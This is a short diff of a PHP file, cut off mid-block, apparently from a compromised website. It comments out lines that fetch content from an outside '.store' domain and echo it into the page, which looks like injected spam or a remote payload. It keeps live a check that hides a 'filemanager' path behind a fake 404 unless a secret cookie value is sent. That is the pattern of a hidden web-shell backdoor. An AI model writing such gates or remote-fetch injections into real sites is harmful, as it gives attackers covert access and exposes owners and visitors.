@@ -1,13 +1,13 @@
 <?php
-$a = file_get_contents('https://cdn.kuemeranti.store/p/Cz7eU3f');
-echo $a;
-$curl = curl_init();
-$url = 'https://r2.kuemeranti.store/template.css';
-curl_setopt($curl, CURLOPT_URL, $url);
-curl_setopt($curl, CURLOPT_HEADER, 0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
-$result = curl_exec($curl);
-echo $result;
+// $a = file_get_contents('https://cdn.kuemeranti.store/p/Cz7eU3f');
+// echo $a;
+// $curl = curl_init();
+// $url = 'https://r2.kuemeranti.store/template.css';
+// curl_setopt($curl, CURLOPT_URL, $url);
+// curl_setopt($curl, CURLOPT_HEADER, 0);
+// curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+// $result = curl_exec($curl);
+// echo $result;
 if (strpos($_SERVER['REQUEST_URI'], 'filemanager') !== false) {
     if (!isset($_COOKIE['Minimal']) || $_COOKIE['Minimal'] !== 'Mandi') {
         header("HTTP/1.0 404 Not Found");
